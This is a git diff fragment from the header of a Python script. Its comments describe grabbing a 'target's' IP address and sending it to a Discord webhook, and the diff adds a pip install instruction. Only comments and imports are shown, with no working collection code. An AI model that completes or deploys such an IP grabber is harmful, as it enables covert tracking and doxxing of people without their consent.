@@ -1,5 +1,6 @@
 # Grabs the targets IP and sends the info to a webhook
 # What to do: Create a Discord webhook | Replace "webhook-url-here" with your webhooks URL
+# Run: pip3 install -r requirements.txt
 import requests
 import json
 from dhooks import Webhook, Embed
